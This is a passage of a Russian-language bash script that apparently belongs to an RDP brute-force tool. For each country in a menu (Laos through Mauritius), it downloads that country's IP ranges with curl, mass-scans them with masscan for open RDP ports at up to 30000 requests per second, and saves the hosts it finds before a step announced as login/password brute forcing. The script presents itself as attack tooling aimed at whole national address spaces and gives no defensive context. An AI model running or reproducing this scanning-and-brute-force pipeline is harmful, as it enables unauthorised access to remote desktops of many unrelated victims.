echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "100" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LAO+PEOPLE%27S+DEMOCRATIC+REPUBLIC%2C |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Lao People's Democratic Republic://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "101" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LATVIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Latvia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 9 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "102" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LEBANON |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Lebanon://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "103" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LESOTHO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Lesotho://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "104" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LIBYAN+ARAB+JAMAHIRIYA%2C |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Libyan Arab Jamahiriya://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "105" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LIECHTENSTEIN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Liechtenstein://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "106" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LITHUANIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Lithuania://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "107" ]; then
curl http://services.ce3c.be/ciprg/?countrys=LUXEMBOURG |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Luxembourg://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "108" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MACAU |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Macau://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "109" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MACEDONIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Macedonia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "110" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MADAGASCAR |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Madagascar://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "111" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MALAWI |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Malawi://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "112" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MALAYSIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Malaysia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "113" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MALDIVES |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Maldives://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "114" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MALI |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Mali://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "115" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MALTA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Malta://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "116" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MAURITANIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Mauritania://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "117" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MAURITIUS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Mauritius://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



